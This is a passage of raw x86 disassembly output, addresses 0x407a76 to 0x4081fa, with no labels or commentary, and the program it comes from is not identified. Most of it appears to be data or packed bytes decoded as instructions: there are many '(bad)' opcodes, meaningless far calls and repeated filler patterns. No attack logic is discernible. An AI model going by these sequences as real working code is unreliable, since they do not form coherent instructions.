  407a76:	arpl   WORD PTR [eax],di
  407a78:	xchg   ebx,eax
  407a79:	gs addr16 xor al,0x67
  407a7d:	imul   ebp,DWORD PTR [ebx+0x70],0x6c6f6d5b
  407a84:	outs   dx,DWORD PTR ds:[esi]
  407a85:	jno    0x407afa
  407a87:	push   0x64777563
  407a8c:	ja     0x407b07
  407a8e:	pop    ebx
  407a8f:	or     BYTE PTR [ebx+0x5d],0x5f
  407a93:	jl     0x407af4
  407a95:	popa   
  407a96:	arpl   WORD PTR [eax-0x6d],di
  407a99:	gs addr16 je 0x407b04
  407a9d:	imul   ebp,DWORD PTR [ebx+0x70],0x6f6d69
  407aa4:	add    BYTE PTR [eax],al
  407aa6:	add    BYTE PTR [eax],al
  407aa8:	ins    BYTE PTR es:[edi],dx
  407aa9:	jne    0x407b1c
  407aab:	jae    0x407b15
  407aad:	popa   
  407aae:	jne    0x407b27
  407ab0:	fs ins DWORD PTR es:[edi],dx
  407ab2:	jns    0x407b2f
  407ab4:	pusha  
  407ab5:	jns    0x407b34
  407ab7:	jg     0x407a95
  407ab9:	test   DWORD PTR [edx-0x7a4e277d],eax
  407abf:	xchg   DWORD PTR [ebp-0x5d],esi
  407ac2:	mov    cl,BYTE PTR [edx-0x71793002]
  407ac8:	cli    
  407ac9:	retf   
  407aca:	xchg   edx,eax
  407acb:	xchg   edx,eax
  407acc:	push   es
  407acd:	fmul   DWORD PTR [esi-0x652bfd6a]
  407ad3:	call   0xbbea:0x9e96bfee
  407ada:	bound  esp,QWORD PTR [edx-0x59a1382a]
  407ae0:	rol    bl,cl
  407ae2:	push   0xffffffaa
  407ae4:	push   ds
  407ae5:	lock data16 scas al,BYTE PTR es:[edi]
  407ae8:	sbb    ch,ah
  407aea:	jb     0x407a9e
  407aec:	es clc 
  407aee:	outs   dx,BYTE PTR ds:[esi]
  407aef:	mov    dh,0x22
  407af1:	hlt    
  407af2:	jp     0x407aae
  407af4:	push   cs
  407af5:	loopne 0x407b6d
  407af7:	mov    esi,0xc2425c0a
  407afc:	mov    dh,0x67
  407afe:	ds (bad) 
  407b00:	mov    dl,0x63
  407b02:	dec    edx
  407b03:	retf   0x8fbe
  407b06:	inc    esi
  407b07:	into   
  407b08:	mov    edx,0xd2528b
  407b0d:	add    BYTE PTR [eax],al
  407b0f:	add    BYTE PTR [eax],al
  407b11:	(bad)  
  407b12:	xchg   edi,eax
  407b13:	dec    esi
  407b14:	(bad)  
  407b15:	ret    0x5a93
  407b18:	fisubr DWORD PTR [esi-0x5521a981]
  407b1e:	jnp    0x407b42
  407b20:	loop   0x407ab8
  407b22:	xchg   DWORD PTR [esi],ebx
  407b24:	out    0x92,al
  407b26:	sub    DWORD PTR [edx],0xffffffea
  407b29:	pop    esi
  407b2a:	scas   eax,DWORD PTR es:[edi]
  407b2b:	and    eax,0x31ab5aee
  407b30:	repnz data16 mov bh,0x2d
  407b34:	mul    BYTE PTR [edx-0x4d]
  407b37:	cmp    edx,edi
  407b39:	dec    esi
  407b3a:	lahf   
  407b3b:	xor    eax,0xe9024afe
  407b40:	add    dh,BYTE PTR [edi+0x5]
  407b43:	in     eax,0xfe
  407b45:	jo     0x407b50
  407b47:	loope  0x407b53
  407b49:	jg     0x407b48
  407b4b:	fadd   QWORD PTR [esi]
  407b4d:	jnp    0x407b50
  407b4f:	fst    DWORD PTR [edx]
  407b51:	xchg   DWORD PTR ds:0x19830ed5,edx
  407b57:	rcr    DWORD PTR [edx],1
  407b59:	outs   dx,DWORD PTR ds:[esi]
  407b5a:	or     eax,0x116b16cd
  407b5f:	leave  
  407b60:	loop   0x407bb6
  407b62:	in     eax,0xc4
  407b64:	ficom  WORD PTR [eax-0x17]
  407b67:	shr    dl,0x9c
  407b6a:	fnstsw WORD PTR [esi+eiz*8-0xd471e68]
  407b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b72:	cmc    
  407b73:	mov    ah,0xee
  407b75:	add    BYTE PTR [eax],al
  407b77:	add    BYTE PTR [eax],al
  407b79:	add    BYTE PTR [eax-0x73054f07],ah
  407b7f:	in     eax,dx
  407b80:	lods   al,BYTE PTR ds:[esi]
  407b81:	test   BYTE PTR [eax+0x54a528f1],0xa5
  407b88:	inc    esp
  407b89:	test   eax,0x9d40a950
  407b8e:	sbb    al,0x9d
  407b90:	cmp    al,0xa1
  407b92:	sbb    BYTE PTR [ecx-0x4adb4ac8],ah
  407b98:	xor    al,0xb9
  407b9a:	and    BYTE PTR [ecx-0x32f352d0],bh
  407ba0:	or     al,0xd1
  407ba2:	sub    cl,dl
  407ba4:	or     ch,al
  407ba6:	xor    al,0xc5
  407ba8:	and    al,0xc9
  407baa:	xor    cl,cl
  407bac:	and    BYTE PTR [ebp-0x3ee34444],bh
  407bb2:	mov    eax,0xc4d518bf
  407bb7:	rcl    DWORD PTR [ecx+ebx*8],cl
  407bba:	rcl    bh,0xff
  407bbd:	adc    BYTE PTR [eax-0x36],al
  407bc0:	jp     0x407baf
  407bc2:	add    eax,0xf8697eae
  407bc7:	test   BYTE PTR [ebx-0x7877139b],al
  407bcd:	popa   
  407bce:	mov    al,0x7c
  407bd0:	mov    ebx,DWORD PTR [ebp-0xc]
  407bd3:	or     BYTE PTR [edi-0x6c6af7a7],0x55
  407bda:	cld    
  407bdb:	cwde   
  407bdc:	xchg   edi,eax
  407bdd:	push   ecx
  407bde:	add    BYTE PTR [eax],al
  407be0:	add    BYTE PTR [eax],al
  407be2:	add    BYTE PTR [eax],al
  407be4:	lea    ebx,[ebx-0x606f1bb3]
  407bea:	dec    ecx
  407beb:	cwde   
  407bec:	mov    fs:0xa7688c45,eax
  407bf2:	inc    ecx
  407bf3:	push   eax
  407bf4:	pop    esp
  407bf5:	stos   DWORD PTR es:[edi],eax
  407bf6:	cmp    eax,0x39af6054
  407bfb:	push   0x5c35b374
  407c00:	js     0x407bb9
  407c02:	xor    DWORD PTR [eax+0x6c],esp
  407c05:	mov    ebx,0xbf70442d
  407c0a:	test   eax,0xa5c34439
  407c0f:	sub    eax,0x71a1c748
  407c14:	cmp    al,0xcb
  407c16:	popf   
  407c17:	xor    eax,0x4999cf40
  407c1c:	push   esp
  407c1d:	rcl    DWORD PTR [ebp-0x6e28a7c3],cl
  407c23:	inc    ecx
  407c24:	dec    esp
  407c25:	fisttp DWORD PTR [ebp-0x7620afdb]
  407c2b:	pop    ecx
  407c2c:	and    al,0xe3
  407c2e:	test   DWORD PTR [ebp+0x28],ecx
  407c31:	out    0x81,eax
  407c33:	xchg   ecx,eax
  407c34:	sbb    al,0xeb
  407c36:	jge    0x407bcd
  407c38:	and    bh,ch
  407c3a:	add    ah,bl
  407c3c:	div    cl
  407c3e:	repz loopne 0x407c2b
  407c41:	cmc    
  407c42:	test   esp,0xfbf9de
  407c48:	add    BYTE PTR [eax],al
  407c4a:	add    BYTE PTR [eax],al
  407c4c:	fdiv   st,st(2)
  407c4e:	std    
  407c4f:	dec    DWORD PTR [ecx+esi*1-0x1]
  407c53:	dec    DWORD PTR [ebp+0x3]
  407c56:	add    BYTE PTR [eax],al
  407c58:	sbb    al,0x3
  407c5a:	add    BYTE PTR [eax],al
  407c5c:	sbb    al,0x3
  407c5e:	add    BYTE PTR [eax],al
  407c60:	or     al,0x3
  407c62:	add    BYTE PTR [eax],al
  407c64:	or     al,0x3
  407c66:	add    BYTE PTR [eax],al
  407c68:	sbb    al,0x3
  407c6a:	add    BYTE PTR [eax],al
  407c6c:	sbb    al,0x3
  407c6e:	add    BYTE PTR [eax],al
  407c70:	or     al,0x3
  407c72:	add    BYTE PTR [eax],al
  407c74:	or     al,0x3
  407c76:	inc    DWORD PTR [ebx]
  407c78:	or     al,BYTE PTR [ebx]
  407c7a:	add    BYTE PTR [eax],al
  407c7c:	cli    
  407c7d:	add    al,BYTE PTR [eax]
  407c7f:	add    ah,cl
  407c81:	add    al,BYTE PTR [eax]
  407c83:	add    ah,cl
  407c85:	add    al,BYTE PTR [eax]
  407c87:	add    ah,bl
  407c89:	add    al,BYTE PTR [eax]
  407c8b:	add    ah,bl
  407c8d:	add    al,BYTE PTR [eax]
  407c8f:	add    ah,cl
  407c91:	add    al,BYTE PTR [eax]
  407c93:	add    ah,cl
  407c95:	add    bh,bh
  407c97:	add    ebx,DWORD PTR [edx+eax*1+0x29c0000]
  407c9e:	add    BYTE PTR [eax],al
  407ca0:	mov    WORD PTR [edx],es
  407ca2:	add    BYTE PTR [eax],al
  407ca4:	mov    WORD PTR [edx],es
  407ca6:	add    BYTE PTR [eax],al
  407ca8:	pushf  
  407ca9:	add    al,BYTE PTR [eax]
  407cab:	add    BYTE PTR [edx+eax*1+0x0],bl
  407cb2:	add    BYTE PTR [eax],al
  407cb4:	add    BYTE PTR [edx+eax*1+0x28c0000],cl
  407cbb:	add    BYTE PTR [eax],al
  407cbd:	jne    0x407c54
  407cbf:	xor    edi,edi
  407cc1:	jb     0x407cde
  407cc3:	add    eax,DWORD PTR [eax]
  407cc5:	jne    0x407ce2
  407cc7:	add    eax,DWORD PTR [eax]
  407cc9:	jne    0x407ce6
  407ccb:	add    eax,DWORD PTR [eax]
  407ccd:	jne    0x407cea
  407ccf:	add    eax,DWORD PTR [eax]
  407cd1:	jne    0x407cee
  407cd3:	add    eax,DWORD PTR [eax]
  407cd5:	jne    0x407cf2
  407cd7:	add    eax,DWORD PTR [eax]
  407cd9:	jne    0x407cf6
  407cdb:	add    eax,DWORD PTR [eax]
  407cdd:	jne    0x407cfa
  407cdf:	add    eax,DWORD PTR [eax]
  407ce1:	jne    0x407ca0
  407ce3:	xor    bh,bh
  407ce5:	jp     0x407d02
  407ce7:	add    eax,DWORD PTR [eax]
  407ce9:	jne    0x407d06
  407ceb:	add    eax,DWORD PTR [eax]
  407ced:	jne    0x407d0a
  407cef:	add    eax,DWORD PTR [eax]
  407cf1:	jne    0x407d0e
  407cf3:	add    eax,DWORD PTR [eax]
  407cf5:	jne    0x407d12
  407cf7:	add    eax,DWORD PTR [eax]
  407cf9:	jne    0x407d16
  407cfb:	add    edi,edi
  407cfd:	jbe    0x407d14
  407cff:	xor    edi,edi
  407d01:	repnz std 
  407d03:	xor    bh,bh
  407d05:	jp     0x407d22
  407d07:	add    eax,DWORD PTR [eax]
  407d09:	jne    0x407d26
  407d0b:	add    eax,DWORD PTR [eax]
  407d0d:	jne    0x407d2a
  407d0f:	add    eax,DWORD PTR [eax]
  407d11:	jne    0x407d2e
  407d13:	add    eax,DWORD PTR [eax]
  407d15:	jne    0x407d32
  407d17:	add    eax,DWORD PTR [eax]
  407d19:	add    BYTE PTR [eax],al
  407d1b:	add    BYTE PTR [eax],al
  407d1d:	add    BYTE PTR [ebp+0x4d],dh
  407d20:	xor    bh,bh
  407d22:	mov    dl,0x54
  407d24:	xor    bh,bh
  407d26:	stos   BYTE PTR es:[edi],al
  407d27:	cmp    al,0x30
  407d29:	jmp    DWORD PTR [edx]
  407d2b:	sbb    eax,DWORD PTR [ebx]
  407d2d:	add    BYTE PTR [ebp+0x1b],dh
  407d30:	add    eax,DWORD PTR [eax]
  407d32:	jne    0x407d4f
  407d34:	add    eax,DWORD PTR [eax]
  407d36:	jne    0x407d53
  407d38:	add    eax,DWORD PTR [eax]
  407d3a:	jne    0x407d3e
  407d3c:	jmp    0x9e42f244
  407d41:	xor    BYTE PTR [edx+0x2d],dh
  407d44:	xchg   esi,eax
  407d45:	xor    BYTE PTR [edx+0x2d],ch
  407d48:	mov    ?,WORD PTR [eax]
  407d4a:	bound  ebp,QWORD PTR [ebp+0x27503e8]
  407d50:	jmp    0xe942f258
  407d55:	add    esi,DWORD PTR [ebp+0x2]
  407d58:	jmp    0xe942f260
  407d5d:	add    esi,DWORD PTR [ebp+0x2]
  407d60:	pop    edi
  407d61:	xor    BYTE PTR [ebp+0x2e],dh
  407d64:	call   0xe86af26c
  407d69:	add    esi,DWORD PTR [ebp-0x56]
  407d6c:	call   0xe942f274
  407d71:	add    esi,DWORD PTR [ebp+0x2]
  407d74:	jmp    0xe942f27c
  407d79:	add    esi,DWORD PTR [ebp+0x2]
  407d7c:	es xor dl,bh
  407d7f:	sub    al,0xe9
  407d81:	add    eax,DWORD PTR [eax]
  407d83:	add    BYTE PTR [eax],al
  407d85:	add    BYTE PTR [eax],al
  407d87:	jne    0x407d8b
  407d89:	jmp    0xe942f291
  407d8e:	add    esi,DWORD PTR [ebp-0x7e]
  407d91:	jmp    0xe942f299
  407d96:	add    esi,DWORD PTR [ebp+0x2]
  407d99:	jmp    0xe942f2a1
  407d9e:	add    esi,DWORD PTR [ebp+0x2]
  407da1:	imul   eax,DWORD PTR [esi*2+0x7503e902],0x7404e902
  407dac:	add    ch,al
  407dae:	add    al,0x75
  407db0:	add    ch,cl
  407db2:	add    esi,DWORD PTR [ebp+0x2]
  407db5:	jmp    0x42f2bd
  407dba:	jmp    0xe9408035
  407dbf:	jbe    0x407dc3
  407dc1:	add    al,ch
  407dc3:	jbe    0x407dc7
  407dc5:	add    BYTE PTR [ecx+0x79],ch
  407dc8:	add    al,BYTE PTR [eax]
  407dca:	imul   esi,ecx,0x76e98082
  407dd0:	add    BYTE PTR [eax],0xe5
  407dd3:	push   0xe
  407dd5:	sbb    al,0xdd
  407dd7:	or     BYTE PTR [esi],0x1c
  407dda:	aad    0x7a
  407ddc:	add    al,BYTE PTR [eax]
  407dde:	jmp    0xe9c08059
  407de3:	ins    BYTE PTR es:[edi],dx
  407de4:	or     BYTE PTR [edx],bl
  407de6:	add    edi,DWORD PTR [edi+0x8]
  407de9:	adc    bh,bl
  407deb:	add    BYTE PTR [eax],al
  407ded:	add    BYTE PTR [eax],al
  407def:	add    BYTE PTR [eax+edx*1+0x1084fb12],al
  407df6:	adc    bl,bl
  407df8:	test   BYTE PTR [eax],dl
  407dfa:	adc    bl,bl
  407dfc:	adc    BYTE PTR fs:[edx],dl
  407dff:	(bad)  [eax+edx*1-0x80]
  407e03:	imul   edi,DWORD PTR [ecx-0x7e],0x86ce910
  407e0a:	sbb    al,BYTE PTR [ebx]
  407e0c:	jg     0x407e16
  407e0e:	adc    bh,bl
  407e10:	test   BYTE PTR [eax],dl
  407e12:	adc    bh,bl
  407e14:	test   BYTE PTR [eax],dl
  407e16:	adc    bl,bl
  407e18:	test   BYTE PTR [eax],dl
  407e1a:	adc    bl,bl
  407e1c:	adc    BYTE PTR fs:[edx],dl
  407e1f:	(bad)  [eax+edx*1-0x80]
  407e23:	imul   edi,DWORD PTR [ecx+0x2],0x276e900
  407e2a:	add    cl,ch
  407e2c:	jbe    0x407e30
  407e2e:	add    cl,ch
  407e30:	jbe    0x407e34
  407e32:	add    cl,ch
  407e34:	jbe    0x407e38
  407e36:	add    BYTE PTR [eax],al
  407e38:	mov    edi,?
  407e3a:	(bad)  
  407e3b:	call   FWORD PTR [edi+edi*8-0x630001]
  407e42:	(bad)  
  407e43:	dec    DWORD PTR [edi+edi*8-0x730001]
  407e4a:	(bad)  
  407e4b:	call   FWORD PTR [edi+edi*8-0x1]
  407e4f:	call   FWORD PTR [edi+edi*8-0x1]
  407e53:	inc    DWORD PTR [eax]
  407e55:	add    BYTE PTR [eax],al
  407e57:	add    BYTE PTR [eax],al
  407e59:	dec    esp
  407e5a:	(bad)  
  407e5b:	(bad)  
  407e5c:	dec    DWORD PTR [edi+edi*8-0x1]
  407e60:	call   FWORD PTR [edi+edi*8-0x1]
  407e64:	call   FWORD PTR [edi+edi*8-0x1]
  407e68:	dec    DWORD PTR [edi+edi*8-0x1]
  407e6c:	dec    DWORD PTR [edi+edi*8-0x1]
  407e70:	call   FWORD PTR [edi+edi*8]
  407e73:	(bad)  
  407e74:	call   FWORD PTR [edi+edi*8]
  407e77:	(bad)  
  407e78:	dec    DWORD PTR [edi+edi*8]
  407e7b:	(bad)  
  407e7c:	dec    DWORD PTR [edi+edi*8]
  407e7f:	(bad)  
  407e80:	call   FWORD PTR [edi+edi*8]
  407e83:	(bad)  
  407e84:	call   FWORD PTR [edi+edi*8]
  407e87:	(bad)  
  407e88:	dec    DWORD PTR [edi+edi*8]
  407e8b:	(bad)  
  407e8c:	dec    DWORD PTR [edi+edi*8]
  407e8f:	(bad)  
  407e90:	(bad)  
  407e91:	fdiv   st(6),st
  407e93:	(bad)  
  407e94:	(bad)  
  407e95:	fdiv   st(6),st
  407e97:	(bad)  
  407e98:	dec    esp
  407e9a:	(bad)  
  407e9b:	(bad)  
  407e9c:	dec    esp
  407e9e:	(bad)  
  407e9f:	(bad)  
  407ea0:	(bad)  
  407ea1:	fdiv   st(6),st
  407ea3:	(bad)  
  407ea4:	(bad)  
  407ea5:	fdiv   st(6),st
  407ea7:	(bad)  
  407ea8:	dec    esp
  407eaa:	(bad)  
  407eab:	(bad)  
  407eac:	dec    esp
  407eae:	inc    BYTE PTR [eax]
  407eb0:	add    DWORD PTR [esi+edi*8+0x1975ffff],ebx
  407eb7:	add    eax,DWORD PTR [eax]
  407eb9:	jne    0x407ed5
  407ebb:	add    al,BYTE PTR [eax]
  407ebd:	add    BYTE PTR [eax],al
  407ebf:	add    BYTE PTR [eax],al
  407ec1:	add    BYTE PTR [ebp+0x1a],dh
  407ec4:	add    al,BYTE PTR [ecx]
  407ec6:	je     0x407ee2
  407ec8:	add    al,BYTE PTR [ecx]
  407eca:	je     0x407ee6
  407ecc:	add    al,BYTE PTR [ecx]
  407ece:	je     0x407eea
  407ed0:	add    al,BYTE PTR [ecx]
  407ed2:	jbe    0x407eec
  407ed4:	add    al,BYTE PTR [ecx]
  407ed6:	je     0x407ef2
  407ed8:	add    al,BYTE PTR [ecx]
  407eda:	je     0x407ef6
  407edc:	add    DWORD PTR [ecx],eax
  407ede:	je     0x407efd
  407ee0:	add    DWORD PTR [edx],eax
  407ee2:	ja     0x407f01
  407ee4:	add    DWORD PTR [edx],eax
  407ee6:	ja     0x407f05
  407ee8:	pop    es
  407ee9:	add    al,0x71
  407eeb:	sbb    eax,0x1d790201
  407ef0:	add    DWORD PTR [edx],eax
  407ef2:	ja     0x407f11
  407ef4:	add    DWORD PTR [ecx+edi*2],eax
  407ef7:	pop    ds
  407ef8:	add    DWORD PTR [edx],eax
  407efa:	ja     0x407f13
  407efc:	add    DWORD PTR [edx],eax
  407efe:	ja     0x407f1d
  407f00:	add    DWORD PTR [edx],eax
  407f02:	jno    0x407f1b
  407f04:	pop    es
  407f05:	add    dh,BYTE PTR [edi+0x1d]
  407f08:	pop    es
  407f09:	add    DWORD PTR [edx+ebx*1+0x2],esi
  407f0d:	add    DWORD PTR [esi+ebx*1+0x6],esi
  407f11:	and    DWORD PTR [ebx+ebx*1+0x0],edx
  407f15:	add    edi,DWORD PTR [ebx+0x1c]
  407f18:	add    BYTE PTR [ebx],al
  407f1a:	jbe    0x407f38
  407f1c:	add    BYTE PTR [ebx],al
  407f1e:	jbe    0x407f3c
  407f20:	add    BYTE PTR [ebx],al
  407f22:	jo     0x407f40
  407f24:	add    BYTE PTR ds:0x0,al
  407f2a:	add    BYTE PTR [esi+0x1c],dh
  407f2d:	add    BYTE PTR [ebx],al
  407f2f:	jbe    0x407f4b
  407f31:	add    al,BYTE PTR [ecx]
  407f33:	jbe    0x407f4f
  407f35:	add    BYTE PTR [ecx],al
  407f37:	jbe    0x407f3b
  407f39:	call   0xe843f33e
  407f3e:	add    BYTE PTR [edx+eax*1+0xa],dh
  407f42:	cmp    DWORD PTR ds:0x358e2e02,esi
  407f48:	add    al,BYTE PTR [ebx-0x72]
  407f4b:	xor    eax,0x37728102
  407f50:	add    dh,BYTE PTR [ecx+0x3d02379c]
  407f56:	(bad)  
  407f57:	xor    eax,0xb5643802
  407f5c:	add    bl,BYTE PTR [eax]
  407f5e:	(bad)  
  407f5f:	mov    ch,0x2
  407f61:	inc    edi
  407f62:	mov    ?,WORD PTR [ebp-0x488daefe]
  407f68:	add    bh,BYTE PTR [ecx+0x1802b58d]
  407f6e:	mov    ?,WORD PTR [ebp-0x5efc4cfe]
  407f74:	add    ch,cl
  407f76:	add    esi,DWORD PTR [ebp+0x2]
  407f79:	mov    BYTE PTR [ebx],al
  407f7b:	xlat   BYTE PTR ds:[ebx]
  407f7c:	add    DWORD PTR [edx-0x32fd8afd],ecx
  407f82:	add    ecx,DWORD PTR [edx+eax*1+0x2a503da]
  407f89:	aad    0x3
  407f8b:	xchg   esp,eax
  407f8c:	add    al,al
  407f8e:	add    eax,DWORD PTR [eax]
  407f90:	add    BYTE PTR [eax],al
  407f92:	add    BYTE PTR [eax],al
  407f94:	mov    ebx,0x9003c802
  407f99:	add    al,ah
  407f9b:	add    esi,DWORD PTR [ebp+0x2]
  407f9e:	call   0xac42f8a3
  407fa3:	add    ecx,DWORD PTR [edx+eax*1-0x17]
  407fa7:	add    esi,DWORD PTR [ebp+0x2]
  407faa:	mov    edi,0x81026103
  407faf:	add    ecx,DWORD PTR [ecx+0x2]
  407fb2:	jmp    0x42f4ba
  407fb7:	call   0xa576:0x94ff9f76
  407fbe:	dec    DWORD PTR [edx+0x79]
  407fc1:	sar    bh,cl
  407fc3:	pop    edx
  407fc4:	jno    0x407f61
  407fc6:	call   FWORD PTR [esi+0x79]
  407fc9:	fwait
  407fca:	(bad)  
  407fcb:	cmp    al,0x71
  407fcd:	lahf   
  407fce:	dec    DWORD PTR [ebp+0x79]
  407fd1:	lahf   
  407fd2:	(bad)  
  407fd3:	call   0x740824e
  407fd8:	jns    0x407f79
  407fda:	push   DWORD PTR [eax]
  407fdc:	jno    0x407f7d
  407fde:	(bad)  
  407fdf:	call   0xca40825a
  407fe4:	stos   DWORD PTR es:[edi],eax
  407fe5:	ret    0x90ff
  407fe8:	inc    ah
  407fea:	call   DWORD PTR [eax-0x2c003b02]
  407ff0:	jbe    0x407f87
  407ff2:	(bad)  
  407ff3:	call   0xc940826e
  407ff8:	add    BYTE PTR [eax],al
  407ffa:	add    BYTE PTR [eax],al
  407ffc:	add    BYTE PTR [esi-0x2b],dh
  407fff:	inc    DWORD PTR [esi]
  408001:	jno    0x408005
  408003:	add    cl,ch
  408005:	jbe    0x408009
  408007:	add    BYTE PTR [ecx+esi*2],cl
  40800a:	xchg   ebp,eax
  40800b:	dec    DWORD PTR [ebx]
  40800d:	jns    0x407fc1
  40800f:	inc    DWORD PTR [ebx]
  408011:	jno    0x407fc6
  408013:	(bad)  
  408014:	call   0xb540828f
  408019:	jbe    0x407fb0
  40801b:	(bad)  
  40801c:	mov    eax,0xc6000276
  408021:	ficomp DWORD PTR [edx-0x4ada6a91]
  408027:	sub    eax,0xff9c0285
  40802c:	lods   eax,DWORD PTR ds:[esi]
  40802d:	add    bl,BYTE PTR [ebx-0x4ada8291]
  408033:	push   edx
  408034:	add    BYTE PTR [eax+0x5e],dl
  408037:	jno    0x4080ad
  408039:	inc    ecx
  40803a:	jae    0x40803b
  40803c:	call   DWORD PTR [ebx]
  40803e:	mov    BYTE PTR [eax+0x70],ch
  408041:	cmp    BYTE PTR [edx+0x72],dh
  408044:	push   ebx
  408045:	inc    esp
  408046:	jno    0x4080bb
  408048:	cmp    esi,DWORD PTR fs:[ebx+0x6d]
  40804c:	add    BYTE PTR [ebx+0x62],dl
  40804f:	push   0x64704f70
  408054:	popa   
  408055:	push   eax
  408056:	popa   
  408057:	inc    ecx
  408058:	imul   eax,DWORD PTR [eax-0x77],0x70527060
  40805f:	outs   dx,BYTE PTR ds:[esi]
  408060:	ins    DWORD PTR es:[edi],dx
  408061:	add    BYTE PTR [eax],al
  408063:	add    BYTE PTR [eax],al
  408065:	add    BYTE PTR [eax+eax*2+0x48],dl
  408069:	push   esp
  40806a:	test   eax,0x93004f3d
  40806f:	bound  ebp,QWORD PTR [eax+0x70]
  408072:	nop
  408073:	test   DWORD PTR [edx+0x70],esi
  408076:	pop    ebx
  408077:	jo     0x4080dd
  408079:	dec    ecx
  40807a:	imul   ebx,DWORD PTR [ebp+0x66],0x35c65
  408081:	add    BYTE PTR [ebx-0x6c8f979e],dl
  408087:	popa   
  408088:	jae    0x4080d3
  40808a:	dec    ecx
  40808b:	pop    esi
  40808c:	ror    WORD PTR gs:[eax+0x62306f62],1
  408094:	jno    0x408109
  408096:	fild   WORD PTR [ebp+0x31c6579]
  40809c:	add    BYTE PTR [eax],al
  40809e:	rol    DWORD PTR [esi+0x61d37068],cl
  4080a4:	jae    0x4080ef
  4080a6:	mov    ecx,0x2165665d
  4080ab:	mov    DWORD PTR [edx+0x6f],esp
  4080ae:	lock popa 
  4080b0:	jno    0x408125
  4080b2:	jne    0x4080cd
  4080b4:	add    eax,DWORD PTR [eax]
  4080b6:	jne    0x408118
  4080b8:	lahf   
  4080b9:	push   0x75a48c45
  4080be:	push   eax
  4080bf:	jb     0x408059
  4080c1:	pusha  
  4080c2:	pop    edx
  4080c3:	jbe    0x408094
  4080c5:	outs   dx,BYTE PTR ds:[esi]
  4080c6:	lods   eax,DWORD PTR es:[esi]
  4080c8:	mov    ah,0x64
  4080ca:	add    BYTE PTR [eax],al
  4080cc:	add    BYTE PTR [eax],al
  4080ce:	add    BYTE PTR [esi+ecx*8],dl
  4080d1:	add    eax,DWORD PTR [eax]
  4080d3:	jne    0x408063
  4080d5:	and    BYTE PTR [ebx-0x80],bl
  4080d8:	jecxz  0x408107
  4080da:	sub    eax,0x5d469530
  4080df:	(bad)  
  4080e0:	or     edi,edi
  4080e2:	out    0x9e,al
  4080e4:	sbb    BYTE PTR [ebx],al
  4080e6:	add    BYTE PTR [ebp-0x26],dh
  4080e9:	lds    eax,FWORD PTR [edx+0x31]
  4080ec:	faddp  st(1),st
  4080ee:	inc    esi
  4080ef:	mov    ebp,0xb94abdf2
  4080f4:	(bad)  
  4080f5:	mov    ecx,0xd5eac54e
  4080fa:	push   edx
  4080fb:	shr    esi,0xd1
  4080fe:	push   esi
  4080ff:	lods   eax,DWORD PTR ds:[esi]
  408100:	loop   0x4080cf
  408102:	pusha  
  408103:	xlat   BYTE PTR ds:[ebx]
  408104:	clc    
  408105:	lahf   
  408106:	fs fcomi st,st(4)
  408109:	fwait
  40810a:	push   0x6c9800cf
  40810f:	mov    ds:0xa770b34c,eax
  408114:	dec    eax
  408115:	scas   eax,DWORD PTR es:[edi]
  408116:	je     0x4080c3
  408118:	inc    esp
  408119:	stos   DWORD PTR es:[edi],eax
  40811a:	js     0x4080bb
  40811c:	or     esi,ebx
  40811e:	xor    DWORD PTR [esi+0x27],eax
  408121:	out    dx,al
  408122:	xor    eax,0x2aeb0342
  408127:	push   edx
  408128:	sbb    eax,DWORD PTR [ebx]
  40812a:	add    BYTE PTR [ebp+0x1b],dh
  40812d:	add    eax,DWORD PTR [eax]
  40812f:	jne    0x408133
  408131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408132:	fild   WORD PTR [eax]
  408134:	add    BYTE PTR [eax],al
  408136:	add    BYTE PTR [eax],al
  408138:	xchg   esi,eax
  408139:	ficomp WORD PTR [ebx-0x6451984b]
  40813f:	mov    cl,0x63
  408141:	stos   BYTE PTR es:[edi],al
  408142:	(bad)  
  408143:	lods   eax,DWORD PTR ds:[esi]
  408144:	dec    edi
  408145:	fmulp  st(4),st
  408147:	fist   WORD PTR [esi-0x7f203b22]
  40814d:	in     eax,0xa8
  40814f:	ret    0xc134
  408152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408153:	mov    esi,0xbb30bd38
  408158:	cmp    al,0xb9
  40815a:	sub    al,0xb7
  40815c:	xor    BYTE PTR [ebp-0x2ebb2cc8],dh
  408162:	xor    al,0xcf
  408164:	sub    ch,cl
  408166:	or     al,0xe0
  408168:	push   esi
  408169:	fiadd  WORD PTR [eax+eiz*8]
  40816c:	sub    cl,bl
  40816e:	adc    cl,ch
  408170:	push   ds
  408171:	(bad)  
  408172:	push   cs
  408173:	leave  
  408174:	shl    BYTE PTR [ebx-0x60295af6],cl
  40817a:	push   es
  40817b:	mov    eax,ds:0x9d029bda
  408180:	into   
  408181:	xchg   edi,eax
  408182:	(bad)  
  408183:	cwde   
  408184:	loop   0x408139
  408186:	call   0xca42f68e
  40818b:	cmp    al,0xb5
  40818d:	add    ch,BYTE PTR [edx-0x5e]
  408190:	mov    ah,0x2
  408192:	xor    BYTE PTR [esp+esi*4],cl
  408195:	add    dl,dl
  408197:	add    edx,DWORD PTR [eax+0x3db02]
  40819d:	add    BYTE PTR [eax],al
  40819f:	add    BYTE PTR [eax],al
  4081a1:	xchg   ebx,eax
  4081a2:	add    cl,ah
  4081a4:	add    ecx,DWORD PTR [ecx+0x47041a02]
  4081aa:	add    dl,BYTE PTR [edi]
  4081ac:	add    al,0x91
  4081ae:	add    cl,ch
  4081b0:	add    edx,DWORD PTR [ecx+0x76e90002]
  4081b6:	add    al,BYTE PTR [eax]
  4081b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b9:	adc    esi,DWORD PTR [ecx-0x61fd6fbb]
  4081bf:	dec    eax
  4081c0:	(bad)  
  4081c1:	adc    al,0x94
  4081c3:	jno    0x408149
  4081c5:	pop    ss
  4081c6:	mov    cl,0x68
  4081c8:	jle    0x4081b6
  4081ca:	ret    0xb178
  4081cd:	pop    ss
  4081ce:	xchg   edi,eax
  4081cf:	arpl   WORD PTR [ebp-0x1688421d],cx
  4081d5:	jbe    0x4081d9
  4081d7:	add    BYTE PTR [edx+0x5045b113],bl
  4081dd:	or     eax,0x34f489e
  4081e2:	xchg   esp,eax
  4081e3:	jno    0x408229
  4081e5:	shl    BYTE PTR [eax-0x3d14c198],1
  4081eb:	js     0x40821e
  4081ed:	rcl    BYTE PTR [esi+0x24d44d63],1
  4081f3:	jmp    FWORD PTR [edi-0x46]
  4081f6:	sar    edi,0x30
  4081f9:	push   edx
  4081fa:	ret    
